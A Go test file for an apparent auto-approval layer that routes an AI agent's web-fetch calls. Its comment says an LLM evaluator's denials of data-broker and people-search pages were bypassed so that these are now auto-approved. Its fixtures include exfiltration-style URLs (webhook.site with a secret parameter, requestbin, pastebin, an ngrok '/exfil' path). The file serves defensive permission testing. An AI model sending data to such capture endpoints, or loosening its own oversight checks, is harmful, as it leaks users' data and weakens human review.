package approve

import (
	"encoding/json"
	"testing"

	"github.com/NiallBrickell/pilot/internal/config"
)

// TestWebToolDecision pins Layer 2 for web reads. The evaluator was denying
// these on what sat at the far end of the URL — a vendor's docs, terms page or
// people-search product — which is a judgment about the content, not about the
// user's data. Only a capture endpoint, where a fetch can carry something OUT,
// still reaches the LLM.
func TestWebToolDecision(t *testing.T) {
	cases := []struct {
		name  string
		tool  string
		input string
		want  string
	}{
		{"vendor api docs", "WebFetch", `{"url":"https://docs.apollo.io/docs/find-people-using-filters","prompt":"list every filter"}`, "approve"},
		{"terms of service", "WebFetch", `{"url":"https://www.ipqualityscore.com/terms-of-service","prompt":"quote FCRA restrictions verbatim"}`, "approve"},
		{"data broker product page", "WebFetch", `{"url":"https://endato.com/developer-apis/reverse-phone-search/"}`, "approve"},
		{"authenticated vendor url", "WebFetch", `{"url":"https://secure.accurint.com/bps/509/html/tcol/glb.html"}`, "approve"},
		{"pricing page", "WebFetch", `{"url":"https://www.searchbug.com/pricing-api.aspx"}`, "approve"},
		{"web search", "WebSearch", `{"query":"reverse phone lookup api pricing"}`, "approve"},
		{"codex web fetch", "web_fetch", `{"url":"https://example.com/docs"}`, "approve"},

		// Capture endpoints: the one web read that can move data out.
		{"webhook.site", "WebFetch", `{"url":"https://webhook.site/8f2e-collect?d=secret"}`, ""},
		{"requestbin", "WebFetch", `{"url":"https://eo1x.requestbin.net/?token=abc"}`, ""},
		{"pastebin", "WebFetch", `{"url":"https://pastebin.com/raw/AbCd1234"}`, ""},
		{"ngrok tunnel", "WebFetch", `{"url":"https://a1b2.ngrok.io/exfil"}`, ""},

		// Unrelated tools keep their existing routing.
		{"bash untouched", "Bash", `{"command":"go test ./..."}`, ""},
	}

	cfg := &config.PilotConfig{}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var parsed map[string]any
			if err := json.Unmarshal([]byte(tc.input), &parsed); err != nil {
				t.Fatalf("bad test input: %v", err)
			}
			if got := CheckPilotRules(cfg, tc.tool, parsed, "/tmp/project"); got != tc.want {
				t.Errorf("CheckPilotRules(%s) = %q, want %q", tc.tool, got, tc.want)
			}
		})
	}
}
